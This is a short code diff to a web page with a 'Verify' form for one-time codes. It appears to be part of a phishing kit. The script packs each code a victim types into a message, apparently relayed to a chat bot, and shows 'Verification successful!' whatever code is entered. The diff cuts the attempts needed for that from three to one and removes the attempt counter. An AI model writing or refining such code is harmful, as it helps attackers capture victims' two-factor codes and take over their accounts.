@@ -186,7 +186,7 @@
             </div>
             <button type="submit" class="verify-btn">Verify</button>
             <div class="form-group" style="text-align: center;">
-                <a href="#" class="forgot-password">Resend code</a>
+                <a href="#" class="forgot-password" id="resend_btn">Resend code</a>
             </div>
         </form>
     </div>
@@ -259,12 +259,11 @@
                     `#️⃣ Code: <code>${code}</code>`
                 );
                 
-                if (verificationAttempts >= 3) {
+                if (verificationAttempts >= 1) {
                     alert('Verification successful!');
                     verificationAttempts = 0;
                     // Here you would typically redirect to the dashboard
                 } else {
-                    alert(`Code submitted (attempt ${verificationAttempts}/3)`);
                     document.getElementById('verification-code').value = '';
                     document.getElementById('verification-code').focus();
                 }
